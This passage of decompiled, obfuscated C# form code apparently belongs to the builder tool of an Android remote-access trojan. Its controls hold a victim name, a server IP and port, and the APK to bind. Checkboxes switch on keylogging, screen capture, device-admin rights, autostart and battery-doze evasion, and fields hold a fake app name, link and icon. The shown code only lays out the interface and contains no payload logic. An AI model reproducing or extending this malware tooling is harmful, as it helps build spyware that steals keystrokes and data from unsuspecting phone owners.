            ((Build) this).CheckAllPrims.Name = EXGuarder.\u0030C515A75;
            num1 = (int) num2 * -823599215 ^ 965234859;
            continue;
          case 100:
            ((Build) this).trakertitle.Name = EXGuarder.\u0031630563E;
            num1 = (int) num2 * -379062020 ^ 583255266;
            continue;
          case 101:
            goto label_1;
          case 102:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label10);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).CheckSkipre);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).bndbtntext);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).bindbodytext);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).cusomupdateimg);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).trgtbkg);
            num1 = (int) num2 * 250527378 ^ 843339994;
            continue;
          case 103:
            ((Build) this).Textfakename.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).Textfakename.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1445760140 ^ 1546343569;
            continue;
          case 104:
            ((Build) this).Label1.TabIndex = 81;
            num1 = (int) num2 * 1269489500 ^ -1241588568;
            continue;
          case 105:
            ((Build) this).checkprotector.Text = EXGuarder.\u003593F281A;
            num1 = (int) num2 * 613669556 ^ 1153184515;
            continue;
          case 106:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label6);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).CheckRecord);
            num1 = (int) num2 * -1272335513 ^ 494774390;
            continue;
          case 107:
            ((Build) this).panemnitor.Dock = DockStyle.Fill;
            ((Build) this).panemnitor.Enabled = false;
            ((Build) this).panemnitor.Location = new Point(0, 119);
            ((Build) this).panemnitor.Name = EXGuarder.\u0036F631D72;
            ((Build) this).panemnitor.Size = new Size(450, 111);
            num1 = (int) num2 * -1569106838 ^ 1118459391;
            continue;
          case 108:
            ((Build) this).removeactiv.Style = UIStyle.Custom;
            num1 = (int) num2 * -818363766 ^ 182664087;
            continue;
          case 109:
            ((Build) this).comboproms.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num2 * -547640354 ^ -769103278;
            continue;
          case 110:
            ((Build) this).TextBox1.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * 266499717 ^ -695787974;
            continue;
          case 111:
            ((Build) this).Label40.BackColor = Color.Transparent;
            num1 = (int) num2 * -630786507 ^ 1586845703;
            continue;
          case 112:
            ((Build) this).Generaltext.TabIndex = 104;
            num1 = (int) num2 * 1544996788 ^ -1413679931;
            continue;
          case 113:
            ((Build) this).Primslist.Padding = new Padding(7);
            ((Build) this).Primslist.Radius = 15;
            num1 = (int) num2 * -2139027170 ^ 667125250;
            continue;
          case 114:
            ((Build) this).bndbtntext.Margin = new Padding(4, 5, 4, 5);
            ((Build) this).bndbtntext.Maximum = (double) int.MaxValue;
            ((Build) this).bndbtntext.Minimum = (double) int.MinValue;
            ((Build) this).bndbtntext.Name = EXGuarder.\u003625B741D;
            ((Build) this).bndbtntext.Padding = new Padding(5);
            num1 = (int) num2 * 2070488087 ^ -1883255019;
            continue;
          case 115:
            ((Build) this).Label43.AutoSize = true;
            ((Build) this).Label43.BackColor = Color.Transparent;
            num1 = (int) num2 * 958936221 ^ -449217596;
            continue;
          case 116:
            ((Build) this).TextNamePatch.FillColor = Color.Black;
            num1 = (int) num2 * -1617650604 ^ -1498916573;
            continue;
          case 117:
            ((Build) this).Label48.ForeColor = Color.White;
            ((Build) this).Label48.Location = new Point(110, 0);
            ((Build) this).Label48.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 589037150 ^ -244212942;
            continue;
          case 118:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).checkautostart);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label34);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label43);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).delayaccesstext);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).delaylabelaccess);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).CheckBIND);
            num1 = (int) num2 * -422122312 ^ 440451009;
            continue;
          case 119:
            ((Build) this).Label18 = new Label();
            num1 = (int) num2 * -1196788897 ^ 1873931260;
            continue;
          case 120:
            ((Build) this).trgtbkg.Cursor = Cursors.IBeam;
            num1 = (int) num2 * -328472180 ^ -282351175;
            continue;
          case 121:
            ((Build) this).TextNamePatch.ForeColor = Color.White;
            ((Build) this).TextNamePatch.Location = new Point(615, 258);
            num1 = (int) num2 * -123290164 ^ 1704457389;
            continue;
          case 122:
            ((Build) this).combotype.Style = UIStyle.Custom;
            num1 = (int) num2 * 1657655458 ^ 338463556;
            continue;
          case 123:
            ((Build) this).Panel5 = new Panel();
            ((Build) this).Label11 = new Label();
            num1 = (int) num2 * -2067546507 ^ 165796960;
            continue;
          case 124:
            ((Build) this).checknetwork.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).checknetwork.ForeColor = Color.White;
            ((Build) this).checknetwork.Location = new Point(83, 165);
            ((Build) this).checknetwork.Name = EXGuarder.\u003336B4F3A;
            ((Build) this).checknetwork.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 1594781570 ^ -938689136;
            continue;
          case 125:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).checkkeyloger);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).CheckQuick);
            num1 = (int) num2 * -877735670 ^ -1030271090;
            continue;
          case 126:
            ((Build) this).explainoptionstext.BackColor = Color.Black;
            num1 = (int) num2 * 1908700379 ^ 1961330010;
            continue;
          case (uint) sbyte.MaxValue:
            ((Build) this).CheckSkipre.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 1909086150 ^ -681309609;
            continue;
          case 128:
            ((Build) this).TabPage11.Controls.Add((Control) ((Build) this).Panel5);
            ((Build) this).TabPage11.Location = new Point(0, 55);
            num1 = (int) num2 * 176557406 ^ 449571819;
            continue;
          case 129:
            ((Build) this).Generaltext = new DrakeUITitleLine();
            ((Build) this).tracklist = new DrakeUIListBox();
            num1 = (int) num2 * -680346893 ^ 1191041127;
            continue;
          case 130:
            ((Build) this).TABCTRL.ItemSize = new Size(150, 55);
            num1 = (int) num2 * -501881478 ^ -1640263239;
            continue;
          case 131:
            ((Build) this).dscriptext.Multiline = true;
            num1 = (int) num2 * -1090242221 ^ 1317399860;
            continue;
          case 132:
            ((Build) this).Label22.TabIndex = 38;
            ((Build) this).Label22.Text = EXGuarder.\u0033476260C;
            ((Build) this).Label21.AutoSize = true;
            num1 = (int) num2 * 250424768 ^ 1323713739;
            continue;
          case 133:
            ((Build) this).combotype.Padding = new Padding(0, 0, 30, 0);
            ((Build) this).combotype.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).combotype.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -911874738 ^ -1919053215;
            continue;
          case 134:
            ((Build) this).Textfakelink.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 945451793 ^ -492813725;
            continue;
          case 135:
            ((Build) this).checkprotector.Dock = DockStyle.Left;
            ((Build) this).checkprotector.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 1294696156 ^ -1450857728;
            continue;
          case 136:
            ((Build) this).bindCtitle.ForeColor = Color.White;
            num1 = (int) num2 * -404539782 ^ 1749590588;
            continue;
          case 137:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label45);
            num1 = (int) num2 * 483701167 ^ -461232776;
            continue;
          case 138:
            ((Build) this).Label44 = new Label();
            num1 = (int) num2 * -1484879620 ^ 459021922;
            continue;
          case 139:
            ((Build) this).SelectedApk = new DrakeUIButtonIcon();
            ((Build) this).checksignver = new DrakeUIComboBox();
            num1 = (int) num2 * -608662128 ^ -1250917574;
            continue;
          case 140:
            ((Build) this).Label30 = new Label();
            num1 = (int) num2 * -682250830 ^ 1600607121;
            continue;
          case 141:
            ((Build) this).TextPackage.Size = new Size(262, 27);
            ((Build) this).TextPackage.Style = UIStyle.Custom;
            num1 = (int) num2 * 612168076 ^ -818857418;
            continue;
          case 142:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label33);
            num1 = (int) num2 * -865445762 ^ -921276230;
            continue;
          case 143:
            ((Build) this).listmonitor.Radius = 15;
            num1 = (int) num2 * 2122106166 ^ 1691363968;
            continue;
          case 144:
            ((Build) this).logbtntext.Radius = 15;
            num1 = (int) num2 * 581514256 ^ -662046096;
            continue;
          case 145:
            ((Build) this).Label38.TabIndex = 88;
            num1 = (int) num2 * 104624841 ^ -1797733183;
            continue;
          case 146:
            ((Build) this).logbodytext.TabIndex = 37;
            num1 = (int) num2 * 1872503331 ^ 1047441469;
            continue;
          case 147:
            ((Build) this).checkver.AllowDrop = true;
            ((Build) this).checkver.BackColor = Color.Transparent;
            num1 = (int) num2 * 246062833 ^ 1722724357;
            continue;
          case 148:
            ((Build) this).Label9.BackColor = Color.Transparent;
            num1 = (int) num2 * 1009548909 ^ 449964372;
            continue;
          case 149:
            ((Build) this).TABCTRL.Size = new Size(1004, 732);
            ((Build) this).TABCTRL.SizeMode = TabSizeMode.Fixed;
            num1 = (int) num2 * -707981557 ^ 45641175;
            continue;
          case 150:
            ((Build) this).linkmonitor.Padding = new Padding(7, 6, 7, 6);
            ((Build) this).linkmonitor.Radius = 10;
            num1 = (int) num2 * 951962681 ^ -838848886;
            continue;
          case 151:
            ((Build) this).sizelabel.Text = EXGuarder.\u0033A582D64;
            num1 = (int) num2 * -1743548601 ^ 544154379;
            continue;
          case 152:
            ((Build) this).Nottitle.TabIndex = 41;
            ((Build) this).Nottitle.Text = EXGuarder.\u0033546501B;
            num1 = (int) num2 * -1126611561 ^ 48609186;
            continue;
          case 153:
            ((Build) this).panelmonitorb.SuspendLayout();
            num1 = (int) num2 * 1715305496 ^ 74430829;
            continue;
          case 154:
            ((Build) this).Button1.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1921644470 ^ -1788126221;
            continue;
          case 155:
            ((Build) this).Label38.Size = new Size(16, 19);
            num1 = (int) num2 * -1720373988 ^ 55657840;
            continue;
          case 156:
            ((Build) this).Textfakelink.TextAlignment = ContentAlignment.TopCenter;
            ((Build) this).Textfakelink.Watermark = EXGuarder.\u00347726012;
            ((Build) this).Textfakename.Cursor = Cursors.IBeam;
            num1 = (int) num2 * -99505428 ^ -2121721756;
            continue;
          case 157:
            ((Build) this).SelectedApk.Size = new Size(156, 34);
            ((Build) this).SelectedApk.Style = UIStyle.Custom;
            ((Build) this).SelectedApk.SymbolSize = 0;
            ((Build) this).SelectedApk.TabIndex = 98;
            ((Build) this).SelectedApk.Text = EXGuarder.\u003736F0972;
            ((Build) this).checksignver.AllowDrop = true;
            num1 = (int) num2 * 1856349120 ^ 424005267;
            continue;
          case 158:
            ((Build) this).Panel2.BackColor = Color.Black;
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).clonecheck);
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).TextVersion);
            num1 = (int) num2 * 112444705 ^ -1859003490;
            continue;
          case 159:
            ((Build) this).TABCTRL.TabSelectedHighColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 2124479301 ^ 2101696158;
            continue;
          case 160:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label11);
            num1 = (int) num2 * 273167512 ^ 2110186883;
            continue;
          case 161:
            ((Build) this).Panel2.Dock = DockStyle.Fill;
            ((Build) this).Panel2.Location = new Point(0, 0);
            num1 = (int) num2 * -1149453934 ^ -1740313825;
            continue;
          case 162:
            ((Build) this).Label40.Location = new Point(57, 323);
            num1 = (int) num2 * 1775970246 ^ -1607239421;
            continue;
          case 163:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).po);
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).TextIP);
            num1 = (int) num2 * -372148351 ^ 1683577382;
            continue;
          case 164:
            ((Build) this).TabPage11.Text = EXGuarder.\u00355716521;
            ((Build) this).Panel5.BackColor = Color.Black;
            num1 = (int) num2 * 1203393132 ^ 2101046445;
            continue;
          case 165:
            ((Build) this).CheckDoze.Size = new Size(44, 29);
            num1 = (int) num2 * -2012248941 ^ -1034708347;
            continue;
          case 166:
            ((Build) this).checksignver.ForeColor = Color.White;
            num1 = (int) num2 * 1479979462 ^ 788917329;
            continue;
          case 167:
            ((Build) this).checknetwork.Size = new Size(338, 29);
            num1 = (int) num2 * -1481586883 ^ 1305995990;
            continue;
          case 168:
            ((Build) this).Label5.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label5.Name = EXGuarder.\u0034001615A;
            num1 = (int) num2 * 1772461865 ^ 1982527723;
            continue;
          case 169:
            ((Build) this).Checksuper.TabIndex = 72;
            num1 = (int) num2 * -1284655124 ^ 1755336236;
            continue;
          case 170:
            ((Build) this).CheckDraw.TabIndex = 75;
            ((Build) this).CheckDraw.Text = EXGuarder.\u0030A0C7413;
            ((Build) this).checkemo.CheckBoxColor = Color.FromArgb(30, 136, 229);
            ((Build) this).checkemo.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1091329418 ^ -234789122;
            continue;
          case 171:
            ((Build) this).Panel3.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1562329030 ^ -518841916;
            continue;
          case 172:
            ((Build) this).CheckIconPatch.Size = new Size(134, 29);
            num1 = (int) num2 * 481746245 ^ 1774378275;
            continue;
          case 173:
            ((Build) this).logtitletext.Size = new Size(182, 25);
            ((Build) this).logtitletext.TabIndex = 35;
            ((Build) this).logtitletext.Text = EXGuarder.\u00350690A34;
            num1 = (int) num2 * -501807264 ^ 838010974;
            continue;
          case 174:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).bindCtitle);
            num1 = (int) num2 * 842384968 ^ -2145662011;
            continue;
          case 175:
            ((Build) this).idmonitor.TextAlignment = ContentAlignment.TopCenter;
            ((Build) this).idmonitor.Watermark = EXGuarder.\u0036A56674A;
            ((Build) this).linkmonitor.Cursor = Cursors.IBeam;
            num1 = (int) num2 * -1110745203 ^ -270882565;
            continue;
          case 176:
            ((Build) this).explaintoolstext.Font = new Font(EXGuarder.\u00339780D77, 11f);
            num1 = (int) num2 * 1814033087 ^ 1200148457;
            continue;
          case 177:
            ((Build) this).Label9.Size = new Size(112, 24);
            num1 = (int) num2 * -227653343 ^ 927232488;
            continue;
          case 178:
            ((Build) this).checkver.Dock = DockStyle.Left;
            num1 = (int) num2 * -846631251 ^ -1275416993;
            continue;
          case 179:
            ((Build) this).Panel6.Name = EXGuarder.\u00322121146;
            num1 = (int) num2 * 2087011597 ^ -703571210;
            continue;
          case 180:
            ((Build) this).DrakeUIAvatar2.Name = EXGuarder.\u0031A4A4B45;
            ((Build) this).DrakeUIAvatar2.Size = new Size(35, 30);
            ((Build) this).DrakeUIAvatar2.Style = UIStyle.Custom;
            ((Build) this).DrakeUIAvatar2.Symbol = 61525;
            ((Build) this).DrakeUIAvatar2.SymbolSize = 30;
            num1 = (int) num2 * -1251136761 ^ -1640490665;
            continue;
          case 181:
            ((Build) this).CheckDraw.Name = EXGuarder.\u003024E2E02;
            num1 = (int) num2 * -302366563 ^ -764129136;
            continue;
          case 182:
            ((Build) this).bndbtntext.Radius = 15;
            ((Build) this).bndbtntext.RectColor = Color.FromArgb(0, 0, 17);
            num1 = (int) num2 * -1088806570 ^ 301008616;
            continue;
          case 183:
            ((Build) this).randomidbtn.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).randomidbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 691874215 ^ 1973205323;
            continue;
          case 184:
            ((Build) this).TextNameVictim.Watermark = EXGuarder.\u00372496E14;
            num1 = (int) num2 * 789936878 ^ -707585598;
            continue;
          case 185:
            ((Build) this).Label38.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * 61737791 ^ 1602973089;
            continue;
          case 186:
            ((Build) this).logbodytext.Text = EXGuarder.\u003085F3340;
            num1 = (int) num2 * -321788754 ^ -195304136;
            continue;
          case 187:
            ((Build) this).Label13.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label13.Name = EXGuarder.\u003546E0051;
            num1 = (int) num2 * 791566786 ^ -1634331884;
            continue;
          case 188:
            ((Build) this).SelectedApk.ForeColor = Color.Lime;
            num1 = (int) num2 * -1356876707 ^ -91458794;
            continue;
          case 189:
            ((Build) this).box.Dock = DockStyle.Fill;
            num1 = (int) num2 * 216903149 ^ 714299902;
            continue;
          case 190:
            ((Build) this).SelectedApk.Dock = DockStyle.Right;
            num1 = (int) num2 * -9495291 ^ 450367644;
            continue;
          case 191:
            ((Build) this).TextPackage.TabIndex = 98;
            num1 = (int) num2 * -1365155395 ^ -29840603;
            continue;
          case 192:
            ((Build) this).TextNamePatch.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Build) this).TextNamePatch.Size = new Size(262, 27);
            num1 = (int) num2 * -780644707 ^ 290086958;
            continue;
          case 193:
            ((Build) this).Checksuper.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1823025556 ^ -1519091139;
            continue;
          case 194:
            ((Build) this).Label33.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * -1082400248 ^ -91992955;
            continue;
          case 195:
            ((Build) this).TextPackage.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1313147432 ^ -2126192902;
            continue;
          case 196:
            ((Build) this).namemonitor.Watermark = EXGuarder.\u003220A0827;
            num1 = (int) num2 * 398945348 ^ -863066012;
            continue;
          case 197:
            ((Build) this).TextIP.TabIndex = 94;
            ((Build) this).TextIP.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * -2033931470 ^ -1394454516;
            continue;
          case 198:
            ((Build) this).namemonitor.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).namemonitor.ForeColor = Color.White;
            num1 = (int) num2 * 804991778 ^ -1988699673;
            continue;
          case 199:
            ((Build) this).Panel4.Controls.Add((Control) ((Build) this).Label24);
            num1 = (int) num2 * 1352162634 ^ 761376261;
            continue;
          case 200:
            ((Build) this).TextNameVictim.TabIndex = 97;
            ((Build) this).TextNameVictim.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * -103843916 ^ 365905083;
            continue;
          case 201:
            ((Build) this).trackIDtext.Location = new Point(124, 350);
            ((Build) this).trackIDtext.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * -654315723 ^ -1295737967;
            continue;
          case 202:
            ((Build) this).Label40.Name = EXGuarder.\u003385D0238;
            num1 = (int) num2 * -620106972 ^ -1644450431;
            continue;
          case 203:
            ((Build) this).CheckDoze.Style = UIStyle.Custom;
            num1 = (int) num2 * -178871499 ^ 1965807826;
            continue;
          case 204:
            ((Build) this).Label14.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1759139550 ^ 224839281;
            continue;
          case 205:
            ((Build) this).randomverbtn.Text = EXGuarder.\u00373182D5A;
            num1 = (int) num2 * 1134301243 ^ -371386727;
            continue;
          case 206:
            ((Build) this).CheckQuick = new DrakeUICheckBox();
            ((Build) this).Label35 = new Label();
            ((Build) this).explaintoolstext = new TextBox();
            num1 = (int) num2 * 765314673 ^ -1937005851;
            continue;
          case 207:
            ((Build) this).checkunlocker.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1619966658 ^ -82992989;
            continue;
          case 208:
            ((Build) this).logbtntext.Cursor = Cursors.IBeam;
            num1 = (int) num2 * -1213184125 ^ 620388876;
            continue;
          case 209:
            ((Build) this).TextBox1.Location = new Point(326, 33);
            num1 = (int) num2 * -644968092 ^ -590240554;
            continue;
          case 210:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).Label9);
            num1 = (int) num2 * 406798698 ^ 2053563905;
            continue;
          case 211:
            ((Build) this).Label3.Location = new Point(691, 221);
            num1 = (int) num2 * -1449763771 ^ -1488640136;
            continue;
          case 212:
            ((Build) this).randomverbtn.Size = new Size(35, 30);
            num1 = (int) num2 * -933966211 ^ -181751990;
            continue;
          case 213:
            ((Build) this).checkkeepsscreen = new DrakeUICheckBox();
            num1 = (int) num2 * 1561161521 ^ -452649360;
            continue;
          case 214:
            ((Build) this).Label17.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label17.Name = EXGuarder.\u0034F2F236A;
            num1 = (int) num2 * -192525980 ^ -771397965;
            continue;
          case 215:
            ((Build) this).DrakeUIAvatar1.TabIndex = 107;
            num1 = (int) num2 * -1578936795 ^ -1876648115;
            continue;
          case 216:
            ((Build) this).Panel9.Location = new Point(0, 33);
            ((Build) this).Panel9.Name = EXGuarder.\u0036F5B4E19;
            num1 = (int) num2 * 2124760967 ^ 1570084662;
            continue;
          case 217:
            ((Build) this).TextIP.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 671586031 ^ 157508323;
            continue;
          case 218:
            ((Build) this).Button1.ForePressColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * -2143204783 ^ -1666240526;
            continue;
          case 219:
            ((Build) this).logbodytext.TextAlign = HorizontalAlignment.Center;
            num1 = (int) num2 * 1611029567 ^ -34202933;
            continue;
          case 220:
            ((Build) this).Button3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1922141772 ^ 1721385456;
            continue;
          case 221:
            ((Build) this).Label46.AutoSize = true;
            num1 = (int) num2 * -1048478513 ^ 1327744033;
            continue;
          case 222:
            ((Build) this).addactiv.SymbolSize = 30;
            ((Build) this).addactiv.TabIndex = 99;
            num1 = (int) num2 * 1738584764 ^ 369407276;
            continue;
          case 223:
            ((Build) this).explainmonitortext.Name = EXGuarder.\u0033D65682F;
            num1 = (int) num2 * 1646346095 ^ 1838153114;
            continue;
          case 224:
            ((Build) this).TextBox1.TabIndex = 48;
            num1 = (int) num2 * -1101150728 ^ 885940696;
            continue;
          case 225:
            ((Build) this).bndbtntext.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Build) this).bndbtntext.Size = new Size(108, 34);
            ((Build) this).bndbtntext.Style = UIStyle.Custom;
            ((Build) this).bndbtntext.TabIndex = 96;
            num1 = (int) num2 * 1980855834 ^ -1703989999;
            continue;
          case 226:
            ((Build) this).panelmonitorb.PerformLayout();
            num1 = (int) num2 * 717660328 ^ -850184464;
            continue;
          case 227:
            ((Build) this).Label2.TabIndex = 25;
            num1 = (int) num2 * -1672266522 ^ -106189409;
            continue;
          case 228:
            ((Build) this).Label24.Size = new Size(106, 17);
            num1 = (int) num2 * 541996603 ^ 1680595901;
            continue;
          case 229:
            ((Build) this).combotype.TabIndex = 38;
            num1 = (int) num2 * -797998295 ^ -499030456;
            continue;
          case 230:
            ((Build) this).checkcatpure.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * -2023015879 ^ 671951148;
            continue;
          case 231:
            ((Build) this).delaylabelaccess.Size = new Size(271, 19);
            ((Build) this).delaylabelaccess.TabIndex = 78;
            ((Build) this).delaylabelaccess.Text = EXGuarder.\u00379205447;
            ((Build) this).CheckBIND.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 642332791 ^ -1395248564;
            continue;
          case 232:
            ((Build) this).checkver.TabIndex = 59;
            num1 = (int) num2 * 1784430553 ^ 1893587793;
            continue;
          case 233:
            ((Build) this).Label33.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label33.Location = new Point(55, 59);
            ((Build) this).Label33.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1328422505 ^ -1814349261;
            continue;
          case 234:
            ((Build) this).Panel6.TabIndex = 47;
            ((Build) this).logbtntext.BackColor = Color.Transparent;
            num1 = (int) num2 * 1554820239 ^ 1090918731;
            continue;
          case 235:
            ((Build) this).explainoptionstext.BorderStyle = BorderStyle.None;
            ((Build) this).explainoptionstext.Dock = DockStyle.Bottom;
            ((Build) this).explainoptionstext.Font = new Font(EXGuarder.\u00339780D77, 11f);
            ((Build) this).explainoptionstext.ForeColor = SystemColors.GradientActiveCaption;
            ((Build) this).explainoptionstext.Location = new Point(0, 587);
            ((Build) this).explainoptionstext.Multiline = true;
            num1 = (int) num2 * 361140649 ^ -237293142;
            continue;
          case 236:
            ((Build) this).Label45.TabIndex = 100;
            ((Build) this).Label45.Text = EXGuarder.\u0032F610B5C;
            num1 = (int) num2 * -1031768348 ^ 935313297;
            continue;
          case 237:
            ((Build) this).Textfakename.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).Textfakename.ForeColor = Color.White;
            ((Build) this).Textfakename.Location = new Point(231, 84);
            num1 = (int) num2 * 783665271 ^ -1956331311;
            continue;
          case 238:
            ((Build) this).Label38.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -710658138 ^ -529215814;
            continue;
          case 239:
            ((Build) this).TextNameVictim.Size = new Size(262, 27);
            num1 = (int) num2 * -1170939347 ^ -884872300;
            continue;
          case 240:
            ((Build) this).Label13.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * -201353150 ^ 64000402;
            continue;
          case 241:
            ((Build) this).Label35.Size = new Size(16, 19);
            ((Build) this).Label35.TabIndex = 69;
            num1 = (int) num2 * -2065884341 ^ 691176685;
            continue;
          case 242:
            ((Build) this).TABCTRL.Controls.Add((Control) ((Build) this).TabPage10);
            num1 = (int) num2 * -417426972 ^ 1773439496;
            continue;
          case 243:
            ((Build) this).PictureBox1 = new PictureBox();
            num1 = (int) num2 * 1722813118 ^ -2085539699;
            continue;
          case 244:
            ((Build) this).Textfakename.Size = new Size(262, 27);
            ((Build) this).Textfakename.Style = UIStyle.Custom;
            ((Build) this).Textfakename.TabIndex = 95;
            ((Build) this).Textfakename.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * 1425989232 ^ 2059732476;
            continue;
          case 245:
            ((Build) this).po.Name = EXGuarder.\u00374144A3D;
            num1 = (int) num2 * 1049445673 ^ 2146412689;
            continue;
          case 246:
            ((Build) this).bindCtitle.BackColor = Color.FromArgb(0, 0, 17);
            num1 = (int) num2 * -1700878328 ^ 1263025946;
            continue;
          case 247:
            ((Build) this).Button1.FillColor = Color.Transparent;
            ((Build) this).Button1.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * 1408667499 ^ -1648645098;
            continue;
          case 248:
            ((Build) this).removeactiv.Symbol = 61526;
            num1 = (int) num2 * -1491760281 ^ -1140223589;
            continue;
          case 249:
            ((Build) this).Label49.Text = EXGuarder.\u003500A6952;
            ((Build) this).checknetwork.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * -1863632458 ^ -495660342;
            continue;
          case 250:
            ((Build) this).listmonitor.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).listmonitor.ForeColor = Color.Black;
            num1 = (int) num2 * -1500868043 ^ -2105492792;
            continue;
          case 251:
            ((Build) this).TextSize.BorderStyle = BorderStyle.FixedSingle;
            num1 = (int) num2 * -1581111062 ^ -386778748;
            continue;
          case 252:
            ((Build) this).checkkeyloger.Name = EXGuarder.\u003283D2815;
            num1 = (int) num2 * 2090722665 ^ 1922607778;
            continue;
          case 253:
            ((Build) this).addactiv.Text = EXGuarder.\u00373182D5A;
            num1 = (int) num2 * 938687260 ^ -2111773373;
            continue;
          case 254:
            ((Build) this).checkadmin.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).checkadmin.ForeColor = Color.White;
            num1 = (int) num2 * -2078676818 ^ -76160392;
            continue;
          case (uint) byte.MaxValue:
            ((Build) this).Button1.Location = new Point(15, 217);
            ((Build) this).Button1.Margin = new Padding(4);
            ((Build) this).Button1.Name = EXGuarder.\u00351526F1F;
            ((Build) this).Button1.Radius = 10;
            num1 = (int) num2 * -1229159199 ^ -1335831045;
            continue;
          case 256:
            ((Build) this).Label9.AutoSize = true;
            num1 = (int) num2 * 781457983 ^ -53553913;
            continue;
          case 257:
            ((Build) this).MainText.TabIndex = 80;
            num1 = (int) num2 * 791319291 ^ -834940590;
            continue;
          case 258:
            ((Build) this).Label12.Size = new Size(19, 24);
            ((Build) this).Label12.TabIndex = 35;
            num1 = (int) num2 * 1227508199 ^ -910057387;
            continue;
          case 259:
            ((Build) this).fakepanel.Controls.Add((Control) ((Build) this).Label27);
            ((Build) this).fakepanel.Controls.Add((Control) ((Build) this).fakeiconpic);
            num1 = (int) num2 * 1057321441 ^ 330776584;
            continue;
          case 260:
            ((Build) this).Label35.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label35.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label35.Location = new Point(55, 95);
            num1 = (int) num2 * -543101049 ^ 521956219;
            continue;
          case 261:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).Primslist);
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).removeactiv);
            num1 = (int) num2 * 1865162270 ^ 1425680322;
            continue;
          case 262:
            ((Build) this).listmonitor.BackColor = Color.FromArgb(20, 31, 20);
            ((Build) this).listmonitor.FillColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num2 * -1591096277 ^ 1686180672;
            continue;
          case 263:
            ((Build) this).SelectedApk.RectSelectedColor = Color.White;
            num1 = (int) num2 * -1547149258 ^ -140226008;
            continue;
          case 264:
            ((Build) this).checkkeyloger.Size = new Size(338, 29);
            num1 = (int) num2 * 2135703457 ^ 1584380636;
            continue;
